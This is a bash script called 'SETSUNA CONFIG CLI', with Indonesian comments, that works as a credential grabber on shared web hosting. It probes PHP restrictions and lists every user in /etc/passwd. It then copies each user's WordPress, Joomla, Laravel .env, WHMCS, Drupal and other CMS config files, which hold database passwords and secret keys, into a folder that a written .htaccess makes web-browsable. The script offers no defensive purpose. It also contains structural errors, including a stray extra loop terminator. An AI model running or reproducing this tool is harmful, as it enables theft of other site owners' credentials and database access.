#!/bin/bash
echo "SETSUNA CONFIG CLI"
echo "-----------------------"

# Mengecek apakah open_basedir terdeteksi
open_basedir=$(php -i | grep "open_basedir")
if [ -z "$open_basedir" ]; then
  echo "open_basedir tidak terdeteksi."
else
  echo "open_basedir terdeteksi: $open_basedir"
fi

# Mengecek apakah disable_functions terdeteksi
disable_functions=$(php -i | grep "disable_functions")
if [ -z "$disable_functions" ]; then
  echo "disable_functions tidak terdeteksi."
else
  echo "disable_functions terdeteksi: $disable_functions"
fi

# Mengecek apakah allow_url_fopen terdeteksi
allow_url_fopen=$(php -i | grep "allow_url_fopen")
if [ -z "$allow_url_fopen" ]; then
  echo "allow_url_fopen tidak terdeteksi."
else
  echo "allow_url_fopen terdeteksi: $allow_url_fopen"
fi

# Mendapatkan daftar nama pengguna dari /etc/passwd
usernames=$(awk -F: '{print $1}' /etc/passwd)

# Membuat folder baru untuk menyimpan output file
output_folder="SETSUNA"
mkdir -p "$output_folder"

# Menambahkan perintah untuk membuat file .htaccess di dalam direktori SETSUNA
htaccess_file="$output_folder/.htaccess"
echo "Options +Indexes" > "$htaccess_file"

# Loop melalui setiap pengguna dan mencetak konfigurasi wp-config.php dan configuration.php jika ada
for user in $usernames
do
  config_path_wp="/home/$user/public_html/wp-config.php"
  config_path_joomla="/home/$user/public_html/configuration.php"
  config_path_laravel="/home/$user/public_html/.env"
  config_path_drupal="/home/$user/public_html/sites/default/settings.php"
  config_path_codeigniter="/home/$user/public_html/application/config/database.php"
  config_path_cakephp="/home/$user/public_html/config/app.php"
  config_path_whmcs="/home/$user/public_html/configuration.php"
  config_path_thinkphp="/home/$user/public_html/application/config.php"
  config_path_pyrocms="/home/$user/public_html/system/cms/config/config.php"
  config_path_ojs="/home/$user/public_html/system/cms/config/config.inc.php"
  config_path_vbulletin="/home/$user/public_html/includes/config.php"
  config_path_OS="/home/$user/public_html/os/includes/configure.php"
  
  # Mengecek apakah file wp-config.php ada
  if [ -f "$config_path_wp" ]; then
    # Menyimpan output file untuk WordPress ke folder utama dengan nama [username]-WP-config.txt
    output_file_wp="$output_folder/${user}-WP-config.txt"
    
    if [ -r "$config_path_wp" ]; then
      echo "WordPress Config for user $user:" >> "$output_file_wp"
      cat "$config_path_wp" >> "$output_file_wp"
      echo "----------------------------------" >> "$output_file_wp"
    else
      echo "Tidak dapat membaca file WordPress Config untuk user $user." >> "$output_file_wp"
      echo "----------------------------------" >> "$output_file_wp"
    fi
  fi

  # Mengecek apakah file configuration.php Joomla ada
  if [ -f "$config_path_joomla" ]; then
    # Menyimpan output file untuk Joomla ke folder utama dengan nama [username]-JOOMLA-config.txt
    output_file_joomla="$output_folder/${user}-JOOMLA-config.txt"
    
    if [ -r "$config_path_joomla" ]; then
      echo "Joomla Config for user $user:" >> "$output_file_joomla"
      cat "$config_path_joomla" >> "$output_file_joomla"
      echo "----------------------------------" >> "$output_file_joomla"
    else
      echo "Tidak dapat membaca file Joomla Config untuk user $user." >> "$output_file_joomla"
      echo "----------------------------------" >> "$output_file_joomla"
    fi
  fi

  # Mengecek apakah file .env ada
  if [ -f "$config_path_laravel" ]; then
    # Menyimpan output file untuk Laravel ke folder utama dengan nama [username]-LARAVEL-config.txt
    output_file_laravel="$output_folder/${user}-LARAVEL-config.txt"
    
    if [ -r "$config_path_laravel" ]; then
      echo "Laravel Config for user $user:" >> "$output_file_laravel"
      cat "$config_path_laravel" >> "$output_file_laravel"
      echo "----------------------------------" >> "$output_file_laravel"
    else
      echo "Tidak dapat membaca file Laravel Config untuk user $user." >> "$output_file_laravel"
      echo "----------------------------------" >> "$output_file_laravel"
    fi
  fi

  # Mengecek apakah file settings.php drupal ada
  if [ -f "$config_path_drupal" ]; then
    # Menyimpan output file untuk Laravel ke folder utama dengan nama [username]-DRUPAL-config.txt
    output_file_drupal="$output_folder/${user}-DRUPAL-config.txt"
    
    if [ -r "$config_path_drupal" ]; then
      echo "Drupal Config for user $user:" >> "$output_file_drupal"
      cat "$config_path_drupal" >> "$output_file_drupal"
      echo "----------------------------------" >> "$output_file_drupal"
    else
      echo "Tidak dapat membaca file Drupal Config untuk user $user." >> "$output_file_drupal"
      echo "----------------------------------" >> "$output_file_drupal"
    fi
  fi

  # Mengecek apakah file database.php codeigniter ada
  if [ -f "$config_path_codeigniter" ]; then
    # Menyimpan output file untuk Laravel ke folder utama dengan nama [username]-CI-config.txt
    output_file_codeigniter="$output_folder/${user}-CI-config.txt"
    
    if [ -r "$config_path_codeigniter" ]; then
      echo "CI Config for user $user:" >> "$output_file_codeigniter"
      cat "$config_path_codeigniter" >> "$output_file_codeigniter"
      echo "----------------------------------" >> "$output_file_codeigniter"
    else
      echo "Tidak dapat membaca file CodeIgniter Config untuk user $user." >> "$output_file_codeigniter"
      echo "----------------------------------" >> "$output_file_codeigniter"
    fi
  fi

  # Mengecek apakah file app.php cakephp ada
  if [ -f "$config_path_cakephp" ]; then
    # Menyimpan output file untuk CakePHP ke folder utama dengan nama [username]-CAKEPHP-config.txt
    output_file_cakephp="$output_folder/${user}-CAKEPHP-config.txt"
    
    if [ -r "$config_path_cakephp" ]; then
      echo "CakePHP Config for user $user:" >> "$output_file_cakephp"
      cat "$config_path_cakephp" >> "$output_file_cakephp"
      echo "----------------------------------" >> "$output_file_cakephp"
    else
      echo "Tidak dapat membaca file CakePHP Config untuk user $user." >> "$output_file_cakephp"
      echo "----------------------------------" >> "$output_file_cakephp"
    fi
  fi

  # Mengecek apakah file configuration.php WHMCS ada
  if [ -f "$config_path_whmcs" ]; then
    # Menyimpan output file untuk WHMCS ke folder utama dengan nama [username]-WHMCS-config.txt
    output_file_whmcs="$output_folder/${user}-WHMCS-config.txt"
    
    if [ -r "$config_path_whmcs" ]; then
      echo "WHMCS Config for user $user:" >> "$output_file_whmcs"
      cat "$config_path_whmcs" >> "$output_file_whmcs"
      echo "----------------------------------" >> "$output_file_whmcs"
    else
      echo "Tidak dapat membaca file WHMCS Config untuk user $user." >> "$output_file_whmcs"
      echo "----------------------------------" >> "$output_file_whmcs"
    fi
  fi

  # Mengecek apakah file config.php thinkphp ada
  if [ -f "$config_path_thinkphp" ]; then
    # Menyimpan output file untuk ThinkPHP ke folder utama dengan nama [username]-thinkphp-config.txt
    output_file_thinkphp="$output_folder/${user}-thinkphp-config.txt"
    
    if [ -r "$config_path_thinkphp" ]; then
      echo "ThinkPHP Config for user $user:" >> "$output_file_thinkphp"
      cat "$config_path_thinkphp" >> "$output_file_thinkphp"
      echo "----------------------------------" >> "$output_file_thinkphp"
    else
      echo "Tidak dapat membaca file ThinkPHP Config untuk user $user." >> "$output_file_thinkphp"
      echo "----------------------------------" >> "$output_file_thinkphp"
    fi
  fi

  # Mengecek apakah file config.php pyrocms ada
  if [ -f "$config_path_pyrocms" ]; then
    # Menyimpan output file untuk PyroCMS ke folder utama dengan nama [username]-pyrocms-config.txt
    output_file_pyrocms="$output_folder/${user}-pyrocms-config.txt"
    
    if [ -r "$config_path_pyrocms" ]; then
      echo "PyroCMS Config for user $user:" >> "$output_file_pyrocms"
      cat "$config_path_pyrocms" >> "$output_file_pyrocms"
      echo "----------------------------------" >> "$output_file_pyrocms"
    else
      echo "Tidak dapat membaca file PyroCMS Config untuk user $user." >> "$output_file_pyrocms"
      echo "----------------------------------" >> "$output_file_pyrocms"
    fi
  fi

  # Mengecek apakah file config.inc.php OJS ada
  if [ -f "$config_path_ojs" ]; then
    # Menyimpan output file untuk OJS ke folder utama dengan nama [username]-ojs-config.txt
    output_file_ojs="$output_folder/${user}-ojs-config.txt"
    
    if [ -r "$config_path_ojs" ]; then
      echo "OJS Config for user $user:" >> "$output_file_ojs"
      cat "$config_path_ojs" >> "$output_file_ojs"
      echo "----------------------------------" >> "$output_file_ojs"
    else
      echo "Tidak dapat membaca file OJS Config untuk user $user." >> "$output_file_ojs"
      echo "----------------------------------" >> "$output_file_ojs"
    fi
  fi

  # Mengecek apakah file config.php vbulletin ada
  if [ -f "$config_path_vbulletin" ]; then
    # Menyimpan output file untuk vBulletin ke folder utama dengan nama [username]-vbulletin-config.txt
    output_file_vbulletin="$output_folder/${user}-vbulletin-config.txt"
    
    if [ -r "$config_path_vbulletin" ]; then
      echo "vBulletin Config for user $user:" >> "$output_file_vbulletin"
      cat "$config_path_vbulletin" >> "$output_file_vbulletin"
      echo "----------------------------------" >> "$output_file_vbulletin"
    else
      echo "Tidak dapat membaca file vBulletin Config untuk user $user." >> "$output_file_vbulletin"
      echo "----------------------------------" >> "$output_file_vbulletin"
    fi
  fi
done

  # Mengecek apakah file configure.php OS ada
  if [ -f "$config_path_OS" ]; then
    # Menyimpan output file untuk vBulletin ke folder utama dengan nama [username]-OS-config.txt
    output_file_OS="$output_folder/${user}-OS-config.txt"
    
    if [ -r "$config_path_OS" ]; then
      echo "OS Config for user $user:" >> "$output_file_OS"
      cat "$config_path_OS" >> "$output_file_OS"
      echo "----------------------------------" >> "$output_file_OS"
    else
      echo "Tidak dapat membaca file OS Config untuk user $user." >> "$output_file_OS"
      echo "----------------------------------" >> "$output_file_OS"
    fi
  fi
done

echo "Script telah selesai. Output disimpan dalam folder $output_folder"
